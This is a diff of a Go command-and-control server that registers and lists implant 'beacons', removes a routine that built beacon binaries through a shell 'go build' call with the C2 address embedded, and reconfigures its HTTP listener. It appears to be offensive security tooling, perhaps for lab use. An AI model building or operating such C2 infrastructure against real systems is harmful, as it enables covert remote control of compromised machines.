@@ -4,11 +4,9 @@ import (
 	"fmt"
 	"time"
 	"net"
-	"log"
 	"encoding/json"
 	"strconv"
 	"os"
-	"os/exec"
 	"math/rand"
 	"strings"
 	"bufio"
@@ -67,12 +65,14 @@ func getIfaceIp(iface string) (string) {
 func registerBeacon(updateData CommandUpdate) (*Beacon) {
 	var beacon *Beacon
 	for _, b := range beacons {
-		if b.Id == updateData.Id {
+		if b.Id == updateData.Id && b.Ip == updateData.Ip {
+			b.Ip = updateData.Ip
 			beacon = b 
 		}
 	}
 
-	if beacon == nil {
+	if beacon == nil || beacon.Ip == "n/a" {
+		fmt.Println("[+] New beacon " + updateData.Id + "@" + updateData.Ip)
 		beacon = &Beacon{updateData.Ip, updateData.Id, nil, nil, nil, nil, time.Now()}
 		beacons = append(beacons, beacon)
 	} else {
@@ -82,57 +82,20 @@ func registerBeacon(updateData CommandUpdate) (*Beacon) {
 	return beacon
 }
 
-func listBeacons() {
-	for i, b := range beacons {
-		fmt.Println("[" + strconv.Itoa(i) + "] " + b.Id + "@" + b.Ip + " last seen " + b.LastSeen.String())
-	}
+func convertTime(t time.Duration) (string) {
+	return fmt.Sprintf("%d", int(t.Hours())) + ":" + fmt.Sprintf("%d", int(t.Minutes())) + ":" + fmt.Sprintf("%.2fs", t.Seconds())
 }
 
-func createBeacon(listener int) {
-	reader := bufio.NewReader(os.Stdin)
-	fmt.Print("Proxy? (y/n): ")
-	input, err := reader.ReadString('\n')
-	ip := getIfaceIp(listeners[listener].Iface)
-	port := strconv.Itoa(listeners[listener].Port)
-	beaconName := "beacon" + ip + "." + port	
-	beaconId := genRandID()
+func listBeacons() {
+	for i, b := range beacons {
+		diff := time.Now().Sub(b.LastSeen)
+		status := " last seen " + convertTime(diff) + " ago."
+		if b.LastSeen.Year() == 1 {
+			status = " has not checked in yet."
+		}
 
-	if err != nil {
-		log.Fatal(err)
+		fmt.Println("[" + strconv.Itoa(i) + "] " + b.Id + "@" + b.Ip + status)
 	}
-
-	if input == "y\n" {
-		if len(beacons) == 0 {
-			fmt.Println("No beacons to proxy to.")
-			return
-		}
-		listBeacons()
-		fmt.Print("Choose beacon: ")
-		input, err := reader.ReadString('\n')
-		input = strings.ReplaceAll(input, "\n", "")
-
-		if err != nil {
-			fmt.Println("Invalid input.")
-			return
-		}
-		
-		beacon := getBeaconByIdOrIndex(input)
-
-		if beacon == nil {
-			fmt.Println(input + " is not a beacon.")
-			return
-		}
-
-		notifyBeaconOfProxyUpdate(beacon, beaconId)
-
-		fmt.Println("Using beacon " + beacon.Id + "@" + beacon.Ip + " as proxy.")
-		exec.Command("/bin/sh", "-c", "env CGO_ENABLED=0 GOOS=linux GOARCH=amd64 go build -ldflags '-X main.id=" + beaconId + " -X main.cmdProxyId=" + beacon.Id + " -X main.cmdProxyIp=" + beacon.Ip + " -X main.cmdAddress=" + ip + " -X main.cmdPort=" + port + " -X main.cmdHost=command.com' -o out/" + beaconName + " beacon/*.go").Output()
-	} else {
-		fmt.Println("No proxy")
-		exec.Command("/bin/sh", "-c", "env CGO_ENABLED=0 GOOS=linux GOARCH=amd64 go build -ldflags '-X main.id=" + beaconId + " -X main.cmdAddress=" + ip + " -X main.cmdPort=" + port + " -X main.cmdHost=command.com' -o out/" + beaconName + " beacon/*.go").Output()
-	}
-
-	fmt.Println("Saved beacon for listener " + getIfaceIp(listeners[listener].Iface) + ":" + strconv.Itoa(listeners[listener].Port) + "%" + listeners[listener].Iface + " to out/" + beaconName + ".")
 }
 
 func genRandID() string {
@@ -311,6 +274,7 @@ func notifyBeaconOfProxyUpdate(proxy *Beacon, targetId string) {
 
 func processInput(input string) {
 	cmd := strings.Fields(input);
+	
 	if len(cmd) > 0 && checkArgs(cmd) {
 		switch cmd[0] {
 		//case "script":
@@ -383,17 +347,29 @@ func main() {
 		fmt.Println("Failed to start web interface.")
 	}
 
-	var HttpListener = HttpListener {
-		Iface: "tun0",
+	//var HttpListenerTun0 = HttpListener {
+//		Iface: "tun0",
+//		Hostname: "command.com",
+//		Port: 8001,
+//	}
+
+	var HttpListenerLocalhost = HttpListener {
+		Iface: "enp0s20f0u1",
 		Hostname: "command.com",
-		Port: 8001,
+		Port: 8000,
 	}
 
-	err = HttpListener.startListener()
+	//err = HttpListenerTun0.startListener()
+	//if err != nil {
+	//	fmt.Println("Failed to start http server.")
+	//}
+
+	err = HttpListenerLocalhost.startListener()
 	if err != nil {
 		fmt.Println("Failed to start http server.")
 	}
 
-	listeners = append(listeners, &HttpListener)
+	//listeners = append(listeners, &HttpListenerTun0)
+	listeners = append(listeners, &HttpListenerLocalhost)
 	handleInput()
 }
